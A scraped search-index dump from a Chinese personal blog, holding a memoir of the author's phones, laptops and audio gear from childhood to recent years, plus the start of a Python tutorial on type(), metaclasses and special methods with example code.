记得买来的第一个下午，我爸还没捂热。我就用手机 wap 上网花掉了我爸爸好几十的话费。我爸要去学车，我都不给他。我妈说我爸的不是，于是我爸便没带手机出了门。我当时也非常担心自己让爸爸窝火了。后来其实没事。父亲对年幼贪玩的我，是有很多忍让和爱的。 我爸其实是诺基亚的粉丝。但是随着诺基亚的没落，他开始不再用诺基亚。我写到这的时候，觉得我爸似乎也慢慢在退出历史舞台。话语权和选择权落到了我这样的年轻人。谁年轻的时候没有追求呢？我应该认识到这一点，让自己的人生精彩起来。也要让我的爸妈过上好生活。 很遗憾的是我不记得了我妈妈这段时间用的是什么。妈妈在我的生命中如此重要，可我不记得了好多好多的细节，很是遗憾。 老式磁带机 我刚有记忆的时候，我妈在房间抹粉同时催我起床。可我不起来。于是我妈便会打开超大的老式磁带机催促我起来。听了多了，我也会唱好多歌，一下子就会暴露年龄，哈哈哈。样子大概如下!(老式磁带机)[/images/lines/老式磁带机.png] 我用它听了超级多周杰伦的磁带。 客厅系列 我的家里是院子里一个拥有 21 寸彩电、双立式音响、vcd+ 功放的。还有卡拉 ok。 于是我小时候经常和爸妈在家里唱歌。我甚至是在好几年以后，才知道别人家没有！现在想起来，别人应该都很羡慕小时候的我。 在我家不远，就有一个店子租盗版碟。我爸经常租，而我只能在 8 点半去睡觉。。但我还是看了好多电影，多是成龙和李连杰的。我还记得看过一个蜘蛛侠的电影。结果是一个恐怖片，假的蜘蛛侠。。当时我就觉得蜘蛛侠垃圾，现在想想，那年代谁知道盗版还有不对版的电影呀！ ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:2:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#快乐时光"},{"categories":["blog"],"content":" 上班准备我带着这个手机去的深圳上班。当时的 iPhone 已经非常有名气，但是 4999 的价格真是贵的离谱。三星也贵。小米和魅族都进入了我的视野。 魅族的mx2 魅族的系统外观和小众精品路线，让我非常喜欢。并且一开始觉得小米品牌低端。我更加认品牌和外观设计。 不过之后同学就买了一个小米手机，对比了速度。比小米慢。。。但我还是说服自己，魅族的设计和外观真的好很多。 现在那台手机已经不能开机了。白色的后盖烫得泛黄。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:3:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#上班准备"},{"categories":["blog"],"content":" 上班以后我上班以后，开始觉得自己开始有钱了。便觉得好多东西忍一忍，都能买下来。给自己买了不少的品牌货。手机当然也是一样。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#上班以后"},{"categories":["blog"],"content":" iPhone5s当时我还记得都用起了微信，而微信 5.0 推出了一个新功能 打飞机。刷爆了朋友圈。我还是用的魅族 mx2，而安卓版本的打飞机要在几天后才能更新。一下子，像是拉开了安卓和 iOS 的待遇差距。于是我在第一个月工资到账后，买了一台 iPhone5s。当然了，我借了钱。 当时是一个土豪金颜色要过万。好多的奸商囤货，赚的盆满钵满。我没记错的话，黑色版本不好看。然后买了白色 5888 还是 6888 来着。去的华强北买的港版。因为我当时已经知道香港那边的价格会便宜一些。且我在查资料的时候，发现港版支持 4g 网络！这也是为什么 iPhone5s 我能用到前年 (2017) 年的原因。 评价如下: 从 mx2 换到 iPhone5s，只是屏幕变得修长了，显示面积并没有变大。但是显示效果好了不少。 应该不是第一款指纹识别的手机。但是苹果作为手机标杆。其他厂商后续的机型都立马跟进了。而我也算是第一批用上了指纹识别的人。 性能很强。感觉就是非常流畅。拍照效果非常好。生态也是非常的好。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:1","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#iphone5s"},{"categories":["blog"],"content":" 小米 6转眼就到了 2017 年，我的 iPhone5s 在平时的使用过程中，真的是有点卡卡的。且从我起床开始，就开启了省电模式。让我养成了少用手机的习惯。但真的是不好用了。 我开始物色手机。苹果太贵了，且连续了好几代没有外观更新。或者说对我来讲，没有实质性的更新。当时的想法是屏幕大一些罢了。 之前一直有一个根深蒂固的概念，安卓慢。用久了就会卡。但是用同时的三星 note 系列时候，却发现响应很快。让我有了改观。同时我也去了实体店体验。于是有了让我换安卓的想法。有担心用个 1-2 年就卡了，于是我的第一想法是要有性价比。 小米当时还是性价比路线。而红米也是一个低端机路线，目的是干掉功能机。于是我买了小米 6。价格是 2558。 评价如下: 性能很好。我喜欢傻快的感觉。在开发者选项里把动画等等特效调成了 0.5x 速率。 拍照不够好。甚至对比 iPhone5s 都觉得不如。不过我的拍照需求不高，只是每次用到的时候，都感叹拍照真烂。 价格确实不错。且 MIUI 系统好用。刷国际版用谷歌。挂着 ss 且续航也好。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:2","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#小米-6"},{"categories":["blog"],"content":" 小米 a1也就是在我换了安卓以后的几个月。我开始迷上了谷歌，或者说是谷歌生态。之后也愈发离不开谷歌生态。 MIUI 的国际版虽然很不错，但是和原生还是有差距。我这里的原生是说的 pixel 这样的亲儿子系统。 于是关注到在一个安卓的 Android One/Go 计划。在印度小米和谷歌联合开发了一款手机 a1。系统除了相机部分，都是谷歌来负责的。其实我更希望谷歌来做相机。毕竟谷歌在当时的算法，说独步天下也不为过。 于是我把小米 6 给了我爸。自己入了小米 a1，价格 1368。小米 6 一直到现在 (2019 年末) 都非常好用。甚至可以说完全超出了我爸的性能需求。 拿到手后，折腾了好久。评价如下: 第一点就必须指出缺点 - 续航严重不足。很大关系是我开着 ss 功耗极高。哪怕是 625 这样以续航闻名的 soc，都没有办法。 系统是真的好用。一直都现在，我都依托着谷歌生态。 拍照、性能什么的因为硬件原因，比小米 6 要差不少。但是系统好，所以流畅度可以接受。前几个月 (2019 年 8 月) 拿给了我妹用，非常够用。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:3","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#小米-a1"},{"categories":["blog"],"content":" iPhone X我在换成了小米 a1 以后，只体验到了完整的谷歌生态。却几乎把其他的特性都给丢了。于是一直耿耿于怀，不甘心。在一次喝醉以后，我和同事在晚上大约 10 点的时候去了解放西。说要是有手机店现在还开着，我就买了。于是就这样给了自己一个理由。 为什么选 iPhone X 呢？因为 iPhone 终于大更新了。并且定型了以后，可以确认的是很久时间都不会变。到现在 (2019 年 12 月) 也证明我是对的。只是价格还是那么高高在上。7200 入手的美版，我是真的傻。明明这个价格可以在网上买到国行版本了。 评价如下: 因为是美版的 iPhone X，所以是因特尔基带。型号是真的差！而国行是高通基带。这也是我说我 7000+ 买美版傻逼的地方。 性能没的说。拍照和摄像都是顶级的。又开始觉得 iOS 吊打安卓了。。而且也能继续使用谷歌全家桶。只是没有那么深度的集成。 面部识别确实比指纹要好用。只是当时速度还不够快。现在 iOS 13 已经非常快了。同时新款手机因为 SOC 的升级，也会快上加快。 苹果也算是一改之前越用越慢的特性。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:4","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#iphone-x"},{"categories":["blog"],"content":" HIFI 套装在我从深圳回湖南的时候，在家里带我妹妹 2 个月。入了 hifi 的坑。 在我塞上耳朵后，觉得以前的歌都白听了。每个歌都戴上了更多的感情。而且细节部分太强了。我也懂了什么叫声场、音色等等。 评价: 我买的机器智能读取 tf 卡内的信息。无法直接在网上下载歌曲。所以每个月我都会找歌，特别麻烦。 是否需要飞傲这个前端，对我来说区别并不是那么大。但是达音科的耳机确实不错。没有过多的染色。而且耳机好推。好的耳机重要过前端。 由于慢慢很多手机都没有了耳机孔。于是我卖给了同事。。换上了 AirPods。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:4:5","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#hifi-套装"},{"categories":["blog"],"content":" 20191210 现状","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:5:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#20191210-现状"},{"categories":["blog"],"content":" 红米 k20proiPhone X 其实是可以支撑我一直用到 5G 时代的。但是我换掉了。理由就是续航、信号是真的差，让我经常担忧。 而我要是换到 k20 pro 呢？以旧换新，新的手机还能赚回来钱。把 airpods 一起退掉。用买手机送的无线蓝牙耳机。可以赚 1500 回来了。。于是我就换了。 我的考量如下: 性能没毛病，拍照小米也更上了，全面屏，内存和存储够用，价格香，信号和续航蛮不错的。 小米给我的印象不错，MIUI 蛮好用的。 iOS 的应用开发太麻烦了。一段时间后开发者证书就会过期。而安卓不会这样。且开发方便。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:5:1","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#红米-k20pro"},{"categories":["blog"],"content":" macbook pro2016在我的学生时代，用的联想 g450 笔记本。是一款质量过硬的产品。一直到现在都还在家里服役。给我妹妹玩我的世界。 但就像我之前没有用过 iOS 系统一样。我没有用过 MacOS 系统。虽然对 linux 有使用经验，但不熟练。对类 Unix 系统的哲学思想也是非常喜欢。 我买的 2016 刚刚推出的带 touchbar 256gb 13.3 寸版本。 评价如下: 在我搭配苹果生态使用的时候，真的很强。而且 iOS 开发必须要用到 macOS 系统。 系统速度快。和 iOS 一样流畅。对开发非常友好，甚至可以说是真正的傻瓜式。 雷电口拓展性好，但是需要很多转接头。不过 TypeC 是趋势。 重量轻，好携带。触控条好用。 键盘容易卡碎屑。touchbar 容易卡死等等小毛病。 虽然让我成长了很多。但真是贵，让我花了大价钱。哪怕现在想退掉，也会觉得亏。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:5:2","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#macbook-pro2016"},{"categories":["blog"],"content":" 99 块的红米无线耳机现在的手机已经在慢慢去掉了耳机孔。而且无线耳机也做到了白菜价。而我的这个还是送的。 评价如下: 比起来 AirPods 还是要难用不少。但是便宜，能将就。 因为之前听 hifi 级别的音质，所以从 AirPods 开始我就打算听个响完事了。无所谓音质了。 续航还不错。我听得也没以前多了，但是够用。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:5:3","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#99-块的红米无线耳机"},{"categories":["blog"],"content":" 家里我爸用的是小米 6. 我妹用的小米 a1. 我妈用的红米 5 plus。当时开始流行全面屏概念。其实也就是 18:9 的屏幕。当时我买的时候，觉得蛮不错的。我妈现在也都一直在用。不过估计明年我会给她换手机。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:5:4","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#家里"},{"categories":["blog"],"content":" 20191210 展望现在我越来越觉得我不是在用单一的电子产品，而是在选择自己的生态。来决定自己的科技生活。 各家也开始在生态上发力。估计以后只专攻手机的厂商会慢慢陨落下去。现在就来说下我的考量和对现状的想法吧。不过我也只会说几个我关注的重点。因为其他的我都不看好。 苹果 是一个有着比较悠久历史的公司。特别是在终端产品方面。一直在通过自己的观点，贯彻自己的产品路线。同时通过非常强势的生态管控，第三方开发者也一直跟进变化。从而一直让苹果保持优质体验。 iPhone 一直有小问题，例如信号、续航、充电速度等等。但是总体而言素质非常高。 mac 有着非常好的流畅体验。优秀的外观设计与体验。对开发者相当的友好。 ipad 是平板里生态和功能最好的，没有之一。同时随航功能搭配 macOS，极大的拓展了使用场景。云计算作为未来的趋势，ipad 的能力会越来越强。 AirPods 优秀的使用体验。 这一系列的产品线，全部都联动了起来。打造了一个平均不低于 80 分的生态圈。 华为 自从开始在终端发力以来。现在也开始推出生态圈。虽然暂时不如苹果好用，但是发力快。 华为/荣耀手机都使用自研的 SOC，体验虽不如高通和苹果。但是现在除了游戏场景，性能过剩还是比较严重的。没什么问题。相机其实没有那么夸张的厉害，但是顶级水准。UI 方面其实不怎么样。但是多屏协同是真的好。 电脑方面高端产品个人感觉溢价严重。magicbook pro 等产品还是不错的。但是留了 2.5 英寸的硬盘位，我就觉得很傻。感觉我并不是华为的消费群体。 平板的电脑模式和平行世界非常不错。有效提高了平板的使用体验。同时也能多屏协同。要不是因为安卓和 windows 的联动不如苹果生态，我觉得是比苹果还要强的。 总的来说，产品的平均分也挺高的。但是生态比起来差不少，毕竟也才刚起步。且暂时看来，华为一家公司很难做成这个生态。而且在现在这个时间点，华为无法使用谷歌 service。是一个非常大的痛点。 小米 在最开始是性价比路线。IOT 生态方面算是国内做的最好的。上到空调、投影仪、电视等大型家电，下到魔方、水性笔、指甲刀。 手机的 MIUI 算是国内最好用的安卓 rom 了。同时很多好用的地方。硬件方面基本都是最好的。或者说同价位最好的。非常不错 电脑走性价比路线，挺不错的。外观很简洁。 而手表，平板等等电子产品。我都觉得可以归类到生态里。生态数量非常多，家居也特别强。但是联动性是属于非常多，而不是那种个个都极度精致。一旦别人抄起来，也会特别快。 小米的生态现在应该要开始深耕体验了。把内核做好，护城河才会高。同时性价比的标签，会让更多人把第一次选择留给它。 谷歌 是我在做了好久混子程序员以后才了解到的公司。但是自从接触以后，就再也离不开了。 但是由于谷歌在国内被墙。所以谷歌的硬件一直都不能再国内有好的体验。同时谷歌善于软件方面，但是在硬件方面是真的不怎么样。 哪天谷歌在国内完全正常了。我会很乐意使用他。但现在还不是时候。同时谷歌作为一个软件服务商，在各平台都有方案。也就没有那么着急了。 三星 在我还小的时候，就觉得是大公司作风。大了以后才知道三星是一个帝国。 三星有军工、日用产品、家电、芯片、船坞、代工等等业务。整个韩国就是三星帝国的天下。我也多多少少都会接触到三星的电子产品。 手机三星一直是机皇般的存在，但是在中国份额已经掉到了其他。即使配置一流，顶级屏幕。体验也优秀。但是价格太高，却拉不开多少差距。或者说没有 get 到国人的 G 点。 因为屏幕好，内存好，固态好。所以如果想要顶级的体验，我肯定会选择三星的设备。但是三星在市场颓废的同时，也开始为其他厂商提供元器件。所以三星会是我以后评判顶级元器件基准。 在个人看来，三星虽然有很多的自家生态产品。但是体验不佳。单打独斗还行，组合起来并没有 1+1\u003e2 的感觉。不看好。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:6:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#20191210-展望"},{"categories":["blog"],"content":" 20191210 红米发布会笔记本虽然便宜。但是内存太小。对我这样的大内存需求者不友好。 音响产品是越来越便宜了。如果是用小米生态，小爱同学会慢慢变成必备品。 路由器一直被网友们诟病。但是价格实在是便宜。后续我还是会考虑入手一个。 红米 k30 手机: 支持 5G 的 Soc，性能强过 835，甚至到达 845 水平。gpu 由于我很少玩游戏，所以不在乎。 120hz 刷新率。这一点真的对手机体验提升特别大。估计在之后将全面普及。之后的换机我也只会考虑 120hz 以上的手机了，否则我会觉得比不过红米 k30。不值得买。 4500 电池、红外、挖孔屏 (这个一般般)、最新的索尼摄像头。水桶机般的配置。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:7:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#20191210-红米发布会"},{"categories":["blog"],"content":" 20210822 换笔记本和手机笔记本电脑 用的是小新 Pro13。最大缺点是键盘键程太短了，买之前觉得 macbookpro 的那种蝴蝶键盘都能忍受了，怎么会有问题呢。结果是真的垃圾到不想用。同时也因为接口比较少，转换器也是少不了的。当然了比之前的 macbookpro 强了一些，但是对于计算机的从业人员来说还是不够用。。 是 2020 年终买的。macbookpro 转手卖了 5000 块，加了几百块。不想加太多钱。觉得便携，性能还不错。同时我在工位上也配置了键盘和鼠标。所以觉得还不错。 手机 现在用的是小米 10。他的摄像头有点喜忧参半。清晰的时候确实很清晰，可是在拍摄近物的时候会出现严重的虚化，这一点在日常使用中的体现就是扫码老是扫不上。。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:8:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#20210822-换笔记本和手机"},{"categories":["blog"],"content":" 20230714 买房以后买房以后开始用台式机了, 在显卡最贵的 2022 年. 2 个 4 k 显示器 网易严选升降桌 金豪人体椅子 G 102 有线鼠标 小米屏幕挂灯 i5-12600k, 32g内存, SN570/1T, 微星B660M迫击炮WiFi, 3060ti七彩虹 最错误的决定就是换掉了 小米10,反向升级到了小米 12, 是真的卡的不行. 然后买的车是思域 2022, 它在国内只有 carlife, 阉割掉了 carplay. 而小米的车载只支持 iccoa 协议, 而自带的本田车机导航不好用. 因此我计划换 iphone 15, 一直在等. 因为 15 是 usb-c 接口. ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:9:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#20230714-买房以后"},{"categories":["blog"],"content":" 最新 手机小米 14 电脑台式机 i5-12600k, 32g内存, SN570/1T, 微星B660M迫击炮WiFi, 3060ti七彩虹 2 个 4 k 显示器 G 102 有线鼠标 小米屏幕挂灯 网易严选升降桌 等待: 等待苹果 ai 情况，关注下一代的内存，还有 17 plus 屏幕。 mac 不插电一样强的性能? 每一代都要看视频观察 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:10:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#最新"},{"categories":["blog"],"content":"最近把手上的事情都忙完了。准备来好好巩固自己的python知识。为什么标题是技巧呢，因为这部分是它和其他语言最大的不同，或者说特点。要玩得6，不熟这一些知识点，肯定是不行","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/"},{"categories":["blog"],"content":" 简介最近把手上的事情都忙完了。准备来好好巩固自己的 python 知识。为什么标题是技巧呢，因为这部分是它和其他语言最大的不同，或者说特点。要玩得 6，不熟这一些知识点，肯定是不行。 ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:1:0","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#简介"},{"categories":["blog"],"content":" python 的类python 可以用函数式编程。也支持面向对象编程。 在使用函数式编程的时候，多数都是用来写脚本。同时这也是 python 最开始发光发亮的点。但是在处理结构性数据以及架构项目的时候，面向对象的优势就会凸显出来。同时也有很多的黑魔法让你快速完成原型的构造。 ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:2:0","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#python-的类"},{"categories":["blog"],"content":" 先说 type 函数我们经常用 type 函数来查看对象的类型信息。但还有一个用法，就是用 type 来生成对象。当你在写 python class 代码的时候，解析器遇到 class 代码块，就会解析 class 结构，然后用 type 来构造对象。 # name代表类名，base代表父类或者说基类，attrs为字典形式，代表属性值。 type(name, base, attrs) ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:2:1","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#先说-type-函数"},{"categories":["blog"],"content":" type 和元类 class TMetaClass(type): def __new__(cls, name, base, attrs): print('in TMetaClass new') return type.__new__(cls, name, base, attrs) def __init__(self, object_or_name, bases, dict): print('in TMetaClass init') super().__init__(object_or_name, bases, dict) class Person(metaclass=TMetaClass): def __new__(cls): print('in Person') return object.__new__(cls) def __init__(self): print(self.__class__.__name__) super().__init__() def test(self): print('Person test..') class Man(Person): def __new__(cls): print('in Man') return object.__new__(cls) def test(self): print('Man test..') print('-'*20) kentxxq1 = Person() kentxxq1.test() print('-'*20) kentxxq2 = Man() kentxxq2.test() # 结果 # in TMetaClass new # in TMetaClass init # in TMetaClass new # in TMetaClass init # -------------------- # in Person # Person # Person test.. # -------------------- # in Man # Man # Man test.. 总结几个要点: type 可以通常被继承来使用。用法是 type.__new__，如果 __new__ 方法返回的不是实例化时的类型，不会进入到 __init__ 方法。 Person 指定元类以后，在定义过程中会进入元类 __new__ 和 __init__ 方法。而 Man 继承 Person 以后，定义过程也是进入元类的方法。在 python 中类也是对象，这里说的定义过程，也就是构建一个类对象。 而在实例化的过程中。使用的都是各自的 __new__ 方法。这里的实例化是将类对象进行实例化。 你在正常的代码编写过程中，很容易想到剥离相同的代码。放到一个基类中。那你什么时候应该要想到用基类呢？当你想要控制子类的行为时。 可以参考 orm 的做法，那么是实际代码中的使用方法应该如下: 在元类中编写构建类时需要做的事情。例如把子类所有的数据存放到一个 mapping 字典中。 编写一个基类，把所有继承者通用特性综合到一起。 在继承者内部编写不同之处 (调用者)。调用者可以非常方便的去使用基类，编写简单明了的代码。 上面的例子，是判断字段是否为 Field 类型。如果是的，那么这个变量代表的就是数据库内的字段名。 再举个例子，别人在继承你的基类时，加上了一个名字为 kentxxq 的变量，但是你对这个名字深恶痛绝！你就可以在基类指定 metaclass，而 metaclass 里对 attrs 进行判断，然后去掉它。这样别人要是不理解元类，就只能改变量名了！同样的方法，你也可以修改 name 和 base。也就是说，你可以通过条件操作这个子类会变成什么样子。 还来一个例子，哈哈。你写了一个很牛逼很牛逼的通用工具模块。别人只需要继承你，就可以让代码性能提高 10000%！你想看看到底有多少人再用！那么你就可以在这里做个统计，不就明白啦！ 当然还有很多的地方可以用上，关键在于你的需求。 ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:2:2","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#type-和元类"},{"categories":["blog"],"content":" 特殊的内部函数 方法 调用方式 解释 _new_(cls [,…]) instance = MyClass(arg1, arg2) new 在创建实例的时候被调用 _init_(self [,…]) instance = MyClass(arg1, arg2) init 在创建实例的时候被调用 _cmp_(self, other) self == other, self \u003e other, 等。 在比较的时候调用 _pos_(self) +self 一元加运算符 _neg_(self) -self 一元减运算符 _invert_(self) ~self 取反运算符 _index_(self) x[self] 对象被作为索引使用的时候 _nonzero_(self) bool(self) 对象的布尔值 _getattr_(self, name) self.name # name 不存在 访问一个不存在的属性时 _setattr_(self, name, val) self.name = val 